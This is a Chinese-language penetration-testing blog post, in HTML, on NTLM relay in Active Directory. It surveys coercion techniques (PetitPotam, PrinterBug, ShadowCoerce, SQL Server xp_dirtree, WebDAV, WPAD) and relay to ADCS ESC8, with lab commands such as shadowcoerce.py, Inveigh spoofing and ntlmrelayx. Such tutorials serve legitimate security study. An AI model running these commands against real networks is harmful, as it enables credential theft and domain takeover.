@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>NTLM Relay - 柠檬k</title><meta name="Description" content="Personal Blog"><meta property="og:title" content="NTLM Relay" />
+<meta property="og:description" content="本篇主要围绕下图进行。来自
+https://www.thehacker.recipes/ad/movement/ntlm/relayNTLM relay.drawio.png
+&#34; https://www.thehacker.recipes/ad/movement/ntlm/relay 
+原理直接看国外老哥写的这篇文章NTLM RELAY。本文主要讲Relay的一些路径。
+触发NTLM认证。 SMB PetitPotam（MS-EFSR） https://github.com/topotam/PetitPotam
+ MS-EFSR 是 Microsoft 的加密文件系统远程协议。它对远程存储并通过网络访问的加密数据执行维护和管理操作，并可作为 RPC 接口使用。该接口可通过 \pipe\efsrpc、\pipe\lsarpc、\pipe\samr、\pipe\lsass 和 \pipe\netlogon SMB 命名管道使用。
+MS-efs触发机器账户强制返回身份验证。默认走SMB协议。
+ 如果机器开启lsarpc的匿名访问。即可再不知道账户密码的情况下NTLM身份认证。
+PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
+ Microsoft 的 Print Spooler 是一项处理打印作业和其他与打印相关的各种任务的服务。控制域用户/计算机的攻击者可以通过特定的 RPC 调用触发运行它的目标的假脱机服务，并使其对攻击者选择的目标进行身份验证。此缺陷是“无法修复”，默认情况下在所有 Windows 环境中启用。
+强制身份验证通过 SMB 进行。
+上面提到的“具体调用”就是 RpcRemoteFindFirstPrinterChangeNotificationEx 通知方法，它是 MS-RPRN 协议的一部分。 MS-RPRN 是 Microsoft 的打印系统远程协议。它定义了打印客户端和打印服务器之间的打印作业处理和打印系统管理的通信。
+ ShadowCoerce (MS-FSRVP)  MS-FSRVP 是 Microsoft 的文件服务器远程 VSS 协议。它用于在远程计算机上创建文件共享的卷影副本，并促进备份应用程序在 SMB2 共享 上执行应用程序一致的备份和数据恢复。
+滥用的一个要求是在目标服务器上启用“文件服务器 VSS 代理服务”。
+ https://github.com/ShutdownRepo/ShadowCoerce
+1  python3 shadowcoerce." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.com/ntlm-relay/" /><meta property="og:image" content="https://example.com/v1.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-02-18T17:10:15+08:00" />
+<meta property="article:modified_time" content="2022-02-18T17:10:15+08:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://example.com/v1.jpg"/>
+
+<meta name="twitter:title" content="NTLM Relay"/>
+<meta name="twitter:description" content="本篇主要围绕下图进行。来自
+https://www.thehacker.recipes/ad/movement/ntlm/relayNTLM relay.drawio.png
+&#34; https://www.thehacker.recipes/ad/movement/ntlm/relay 
+原理直接看国外老哥写的这篇文章NTLM RELAY。本文主要讲Relay的一些路径。
+触发NTLM认证。 SMB PetitPotam（MS-EFSR） https://github.com/topotam/PetitPotam
+ MS-EFSR 是 Microsoft 的加密文件系统远程协议。它对远程存储并通过网络访问的加密数据执行维护和管理操作，并可作为 RPC 接口使用。该接口可通过 \pipe\efsrpc、\pipe\lsarpc、\pipe\samr、\pipe\lsass 和 \pipe\netlogon SMB 命名管道使用。
+MS-efs触发机器账户强制返回身份验证。默认走SMB协议。
+ 如果机器开启lsarpc的匿名访问。即可再不知道账户密码的情况下NTLM身份认证。
+PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
+ Microsoft 的 Print Spooler 是一项处理打印作业和其他与打印相关的各种任务的服务。控制域用户/计算机的攻击者可以通过特定的 RPC 调用触发运行它的目标的假脱机服务，并使其对攻击者选择的目标进行身份验证。此缺陷是“无法修复”，默认情况下在所有 Windows 环境中启用。
+强制身份验证通过 SMB 进行。
+上面提到的“具体调用”就是 RpcRemoteFindFirstPrinterChangeNotificationEx 通知方法，它是 MS-RPRN 协议的一部分。 MS-RPRN 是 Microsoft 的打印系统远程协议。它定义了打印客户端和打印服务器之间的打印作业处理和打印系统管理的通信。
+ ShadowCoerce (MS-FSRVP)  MS-FSRVP 是 Microsoft 的文件服务器远程 VSS 协议。它用于在远程计算机上创建文件共享的卷影副本，并促进备份应用程序在 SMB2 共享 上执行应用程序一致的备份和数据恢复。
+滥用的一个要求是在目标服务器上启用“文件服务器 VSS 代理服务”。
+ https://github.com/ShutdownRepo/ShadowCoerce
+1  python3 shadowcoerce."/>
+<meta name="application-name" content="柠檬k">
+<meta name="apple-mobile-web-app-title" content="柠檬k"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://example.com/ntlm-relay/" /><link rel="prev" href="https://example.com/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "NTLM Relay",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/example.com\/ntlm-relay\/"
+        },"image": ["https:\/\/example.com\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  356 ,
+        "url": "https:\/\/example.com\/ntlm-relay\/","datePublished": "2022-02-18T17:10:15+08:00","dateModified": "2022-02-18T17:10:15+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "nmk","logo": "https:\/\/example.com\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "nmk"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="柠檬k"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/cl/"> 文章收集 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/songzhiv" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Type to search" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="柠檬k"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Type to search" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/cl/" title="">文章收集</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/songzhiv" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">NTLM Relay</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>nmk</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ad%E5%9F%9F/"><i class="far fa-folder fa-fw"></i>AD域</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-02-18">2022-02-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 356 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#触发ntlm认证">触发NTLM认证。</a>
+      <ul>
+        <li><a href="#smb">SMB</a>
+          <ul>
+            <li><a href="#petitpotamms-efsr">PetitPotam（MS-EFSR）</a></li>
+            <li><a href="#printerbugms-rprn">PrinterBug（MS-RPRN）</a></li>
+            <li><a href="#shadowcoerce-ms-fsrvp">ShadowCoerce (MS-FSRVP)</a></li>
+            <li><a href="#sql-server">Sql Server</a></li>
+          </ul>
+        </li>
+        <li><a href="#http">HTTP</a>
+          <ul>
+            <li><a href="#webdav">WEBDAV</a></li>
+            <li><a href="#wpad配合dhcpv6">WPAD配合DHCPv6</a></li>
+            <li><a href="#邮件钓鱼">邮件钓鱼</a></li>
+            <li><a href="#xxe与ssrf">XXE与SSRF</a></li>
+            <li><a href="#exchange-ssrf">Exchange SSRF</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#域内机器的签名情况">域内机器的签名情况</a>
+      <ul>
+        <li><a href="#ldap">LDAP</a></li>
+        <li><a href="#smb-1">SMB</a></li>
+      </ul>
+    </li>
+    <li><a href="#relay-to">Relay To？</a>
+      <ul>
+        <li><a href="#adcs-esc8">ADCS ESC8</a></li>
+        <li><a href="#cred-dump">Cred Dump</a></li>
+        <li><a href="#exec">EXEC</a></li>
+        <li><a href="#枚举信息">枚举信息</a></li>
+        <li><a href="#创建用户ldaps">创建用户（LDAPS）</a></li>
+        <li><a href="#exchange高权限">Exchange（高权限）</a></li>
+        <li><a href="#影子凭证shadow-credentials">影子凭证（Shadow Credentials）</a></li>
+        <li><a href="#rbcd低权限">RBCD（低权限）</a></li>
+      </ul>
+    </li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>本篇主要围绕下图进行。<a href="https://en.hackndo.com/ntlm-relay/" target="_blank" rel="noopener noreffer">来自</a></p>
+<p><figure><a class="lightgallery" href="https://s2.loli.net/2022/02/18/SQrhck8U62H1dLj.png" title="NTLM relay.drawio.png" data-thumbnail="https://s2.loli.net/2022/02/18/SQrhck8U62H1dLj.png" data-sub-html="<h2>https://www.thehacker.recipes/ad/movement/ntlm/relay</h2><p>NTLM relay.drawio.png</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://s2.loli.net/2022/02/18/SQrhck8U62H1dLj.png"
+            data-srcset="https://s2.loli.net/2022/02/18/SQrhck8U62H1dLj.png, https://s2.loli.net/2022/02/18/SQrhck8U62H1dLj.png 1.5x, https://s2.loli.net/2022/02/18/SQrhck8U62H1dLj.png 2x"
+            data-sizes="auto"
+            alt="https://s2.loli.net/2022/02/18/SQrhck8U62H1dLj.png" />
+    </a><figcaption class="image-caption">https://www.thehacker.recipes/ad/movement/ntlm/relay</figcaption>
+    </figure></p>
+<p>原理直接看国外老哥写的这篇文章<a href="https://en.hackndo.com/ntlm-relay/" target="_blank" rel="noopener noreffer">NTLM RELAY</a>。本文主要讲Relay的一些路径。</p>
+<h2 id="触发ntlm认证">触发NTLM认证。</h2>
+<h3 id="smb">SMB</h3>
+<h4 id="petitpotamms-efsr">PetitPotam（MS-EFSR）</h4>
+<p><a href="https://github.com/topotam/PetitPotam" target="_blank" rel="noopener noreffer">https://github.com/topotam/PetitPotam</a></p>
+<blockquote>
+<p>MS-EFSR 是 Microsoft 的加密文件系统远程协议。它对远程存储并通过网络访问的加密数据执行维护和管理操作，并可作为 RPC 接口使用。该接口可通过 \pipe\efsrpc、\pipe\lsarpc、\pipe\samr、\pipe\lsass 和 \pipe\netlogon SMB 命名管道使用。</p>
+<p>MS-efs触发机器账户强制返回身份验证。默认走SMB协议。</p>
+</blockquote>
+<p>如果机器开启lsarpc的匿名访问。即可再不知道账户密码的情况下NTLM身份认证。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/BZsARCKxMv2Yyk9.png"
+        data-srcset="https://s2.loli.net/2022/02/18/BZsARCKxMv2Yyk9.png, https://s2.loli.net/2022/02/18/BZsARCKxMv2Yyk9.png 1.5x, https://s2.loli.net/2022/02/18/BZsARCKxMv2Yyk9.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/BZsARCKxMv2Yyk9.png"
+        title="image.png" /></p>
+<h4 id="printerbugms-rprn">PrinterBug（MS-RPRN）</h4>
+<p><a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py" target="_blank" rel="noopener noreffer">https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py</a></p>
+<blockquote>
+<p>Microsoft 的 Print Spooler 是一项处理打印作业和其他与打印相关的各种任务的服务。控制域用户/计算机的攻击者可以通过特定的 RPC 调用触发运行它的目标的假脱机服务，并使其对攻击者选择的目标进行身份验证。此缺陷是“无法修复”，默认情况下在所有 Windows 环境中启用。<br>
+强制身份验证通过 SMB 进行。<br>
+上面提到的“具体调用”就是 RpcRemoteFindFirstPrinterChangeNotificationEx 通知方法，它是 MS-RPRN 协议的一部分。 MS-RPRN 是 Microsoft 的打印系统远程协议。它定义了打印客户端和打印服务器之间的打印作业处理和打印系统管理的通信。</p>
+</blockquote>
+<h4 id="shadowcoerce-ms-fsrvp">ShadowCoerce (MS-FSRVP)</h4>
+<blockquote>
+<p>MS-FSRVP 是 Microsoft 的文件服务器远程 VSS 协议。它用于在远程计算机上创建文件共享的卷影副本，并促进备份应用程序在 SMB2 共享 上执行应用程序一致的备份和数据恢复。<br>
+<strong>滥用的一个要求是在目标服务器上启用“文件服务器 VSS 代理服务”。</strong></p>
+</blockquote>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/KcrGQFks5bU7SPo.png"
+        data-srcset="https://s2.loli.net/2022/02/18/KcrGQFks5bU7SPo.png, https://s2.loli.net/2022/02/18/KcrGQFks5bU7SPo.png 1.5x, https://s2.loli.net/2022/02/18/KcrGQFks5bU7SPo.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/KcrGQFks5bU7SPo.png"
+        title="image.png" /></p>
+<p><a href="https://github.com/ShutdownRepo/ShadowCoerce" target="_blank" rel="noopener noreffer">https://github.com/ShutdownRepo/ShadowCoerce</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">python3 shadowcoerce.py -d <span class="s2">&#34;adc.com&#34;</span> -u <span class="s2">&#34;mssql&#34;</span> -p <span class="s2">&#34;song@2020&#34;</span> 10.10.10.123 10.10.10.15
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="sql-server">Sql Server</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">exec</span> master.dbo.xp_dirtree <span class="s1">&#39;\\10.10.10.123\test&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/4ZT1lmLFtYBGv3N.png"
+        data-srcset="https://s2.loli.net/2022/02/18/4ZT1lmLFtYBGv3N.png, https://s2.loli.net/2022/02/18/4ZT1lmLFtYBGv3N.png 1.5x, https://s2.loli.net/2022/02/18/4ZT1lmLFtYBGv3N.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/4ZT1lmLFtYBGv3N.png"
+        title="image.png" /></p>
+<p>目标机器安装webclient时，可通过指定端口触发http类型认证。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">exec</span> master.dbo.xp_dirtree <span class="s1">&#39;\\kali@80/test&#39;</span> --http
+
+https://mp.weixin.qq.com/s?__biz<span class="o">=</span><span class="nv">MzUzNTEyMTE0Mw</span><span class="o">==</span><span class="p">&amp;</span><span class="nv">mid</span><span class="o">=</span>2247484864<span class="p">&amp;</span><span class="nv">idx</span><span class="o">=</span>1<span class="p">&amp;</span><span class="nv">sn</span><span class="o">=</span>94260cb4a4e643764f4cfd3565ae799b
+xp_dirtree <span class="s1">&#39;\\hostname@SSL\test&#39;</span> --ssl <span class="m">443</span>
+xp_dirtree <span class="s1">&#39;\\hostname@SSL@1234\test&#39;</span> --ssl port <span class="m">1234</span>
+xp_dirtree <span class="s1">&#39;\\hostname@1234\test&#39;</span> --http
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/X8rQ1pVmhKHkJCj.png"
+        data-srcset="https://s2.loli.net/2022/02/18/X8rQ1pVmhKHkJCj.png, https://s2.loli.net/2022/02/18/X8rQ1pVmhKHkJCj.png 1.5x, https://s2.loli.net/2022/02/18/X8rQ1pVmhKHkJCj.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/X8rQ1pVmhKHkJCj.png"
+        title="image.png" /></p>
+<h3 id="http">HTTP</h3>
+<h4 id="webdav">WEBDAV</h4>
+<p>在开启<code>webclient</code>（需要安装<code>webdav</code>，开启<code>webclient</code>）时，可结合<code>PetitPotam</code> 、<code>PinterBug</code>发出HTTP的认证</p>
+<p>[安装webdav与开启webclient参考链接](<a href="https://theitbros.com/installing-webdav-client-windows-server-2016/]%28https:/theitbros.com/installing-webdav-client-windows-server-2016/%29" target="_blank" rel="noopener noreffer">https://theitbros.com/installing-webdav-client-windows-server-2016/](https:/theitbros.com/installing-webdav-client-windows-server-2016/)</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/zxg8cJ7UQbSr3TV.png"
+        data-srcset="https://s2.loli.net/2022/02/18/zxg8cJ7UQbSr3TV.png, https://s2.loli.net/2022/02/18/zxg8cJ7UQbSr3TV.png 1.5x, https://s2.loli.net/2022/02/18/zxg8cJ7UQbSr3TV.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/zxg8cJ7UQbSr3TV.png"
+        title="image.png" /></p>
+<p>还有A-TEAM大哥们提到的WEBDAV XXE</p>
+<p><a href="https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/#41-webdav-xxe" target="_blank" rel="noopener noreffer">https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/#41-webdav-xxe</a></p>
+<h4 id="wpad配合dhcpv6">WPAD配合DHCPv6</h4>
+<p><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/5#0x09-wpad-he-mitm6" target="_blank" rel="noopener noreffer">https://daiker.gitbook.io/windows-protocol/ntlm-pian/5#0x09-wpad-he-mitm6</a></p>
+<p><a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener noreffer">https://github.com/Kevin-Robertson/Inveigh</a></p>
+<p><a href="https://www.bettercap.org/installation/" target="_blank" rel="noopener noreffer">https://www.bettercap.org/installation/</a></p>
+<p><a href="https://github.com/dirkjanm/mitm6" target="_blank" rel="noopener noreffer">https://github.com/dirkjanm/mitm6</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Inveigh.exe -spooferip 192.168.52.129
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/Jbx9W1wTqvKHBoF.png"
+        data-srcset="https://s2.loli.net/2022/02/18/Jbx9W1wTqvKHBoF.png, https://s2.loli.net/2022/02/18/Jbx9W1wTqvKHBoF.png 1.5x, https://s2.loli.net/2022/02/18/Jbx9W1wTqvKHBoF.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/Jbx9W1wTqvKHBoF.png"
+        title="image.png" /></p>
+<h4 id="邮件钓鱼">邮件钓鱼</h4>
+<p>outlook与foxmail 图片预览功能支持HTTP和UNC路径，可触发SMB和http类型认证。</p>
+<p>获取HTTP需要在可信域，需要添加一条DNS记录。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/SWyc4f5bk7K1qwn.png"
+        data-srcset="https://s2.loli.net/2022/02/18/SWyc4f5bk7K1qwn.png, https://s2.loli.net/2022/02/18/SWyc4f5bk7K1qwn.png 1.5x, https://s2.loli.net/2022/02/18/SWyc4f5bk7K1qwn.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/SWyc4f5bk7K1qwn.png"
+        title="image.png" /></p>
+<h4 id="xxe与ssrf">XXE与SSRF</h4>
+<p><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/5#0x0a-xxe-and-and-ssrf" target="_blank" rel="noopener noreffer">https://daiker.gitbook.io/windows-protocol/ntlm-pian/5#0x0a-xxe-and-and-ssrf</a></p>
+<blockquote>
+<p>各个语言触发XXE和SSRF的实现不同。同一门语言也有不同的触发方式，</p>
+<p>只要支持UNC路径都能打回net-ntlm hash,如果支持http的话，得看底层实现，有些底层实现是需要判断是否在信任域的，有些底层实现是不需要判断是否信任域，有些需要判断是否信任域里面。</p>
+<p>在xxe和ssrf测试中一般要测试这两个方面</p>
+<ol>
+<li>支不支持UNC路径，比如<code>\\ip\x</code>或者<code>file://ip/x</code></li>
+<li>支不支持HTTP(这个一般支持),是不是需要信任域，信任域是怎么判断的</li>
+</ol>
+</blockquote>
+<h4 id="exchange-ssrf">Exchange SSRF</h4>
+<p><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/7#4.-cve-2018-8581" target="_blank" rel="noopener noreffer">https://daiker.gitbook.io/windows-protocol/ntlm-pian/7#4.-cve-2018-8581</a></p>
+<h2 id="域内机器的签名情况">域内机器的签名情况</h2>
+<p>我们可以在 <strong>Windows管理工具-本地安全策略-本地策略-安全选项</strong> 中查看</p>
+<h3 id="ldap">LDAP</h3>
+<p>LDAP一般只安装在域控上，默认是协商签名而非强制签名。</p>
+<ul>
+<li>即当relay时SMB签名开启或者强制签名时：需要签名</li>
+<li>当SMB签名关闭（SMBv1）或者HTTP的流量时：不需要签名</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/Zq3HX1DJyF85krf.png"
+        data-srcset="https://s2.loli.net/2022/02/18/Zq3HX1DJyF85krf.png, https://s2.loli.net/2022/02/18/Zq3HX1DJyF85krf.png 1.5x, https://s2.loli.net/2022/02/18/Zq3HX1DJyF85krf.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/Zq3HX1DJyF85krf.png"
+        title="image.png" /></p>
+<h3 id="smb-1">SMB</h3>
+<p>域控：作为server端，域控默认是强制SMB签名的。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/JO6w24zBN9PV3Ls.png"
+        data-srcset="https://s2.loli.net/2022/02/18/JO6w24zBN9PV3Ls.png, https://s2.loli.net/2022/02/18/JO6w24zBN9PV3Ls.png 1.5x, https://s2.loli.net/2022/02/18/JO6w24zBN9PV3Ls.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/JO6w24zBN9PV3Ls.png"
+        title="image.png" /></p>
+<p>域内普通机器：作为客户端，默认不开强制签名，默认为Enabled。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/UbJIV7Dd3h8ZS9a.png"
+        data-srcset="https://s2.loli.net/2022/02/18/UbJIV7Dd3h8ZS9a.png, https://s2.loli.net/2022/02/18/UbJIV7Dd3h8ZS9a.png 1.5x, https://s2.loli.net/2022/02/18/UbJIV7Dd3h8ZS9a.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/UbJIV7Dd3h8ZS9a.png"
+        title="image.png" /></p>
+<h2 id="relay-to">Relay To？</h2>
+<p><strong>ADC.com</strong></p>
+<ul>
+<li>10.10.10.10 域控</li>
+<li>10.10.10.14 ADCS</li>
+<li>10.10.10.16 Exchange</li>
+<li>10.10.10.12 普通域内机器</li>
+</ul>
+<p><strong>DDC.com</strong></p>
+<ul>
+<li>10.10.10.20 域控</li>
+<li>10.10.10.21 Exchange</li>
+</ul>
+<h3 id="adcs-esc8">ADCS ESC8</h3>
+<p>定位ADCS服务器：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">certutil -config - -ping
+
+</code></pre></td></tr></table>
+</div>
+</div><p>利用</p>
+<p>python3 ntlmrelayx.py -t http://10.10.10.14/certsrv/certfnsh.asp -smb2support &ndash;adcs &ndash;template DomainController</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/5fFdVhPJnBSgzRC.png"
+        data-srcset="https://s2.loli.net/2022/02/18/5fFdVhPJnBSgzRC.png, https://s2.loli.net/2022/02/18/5fFdVhPJnBSgzRC.png 1.5x, https://s2.loli.net/2022/02/18/5fFdVhPJnBSgzRC.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/5fFdVhPJnBSgzRC.png"
+        title="image.png" /></p>
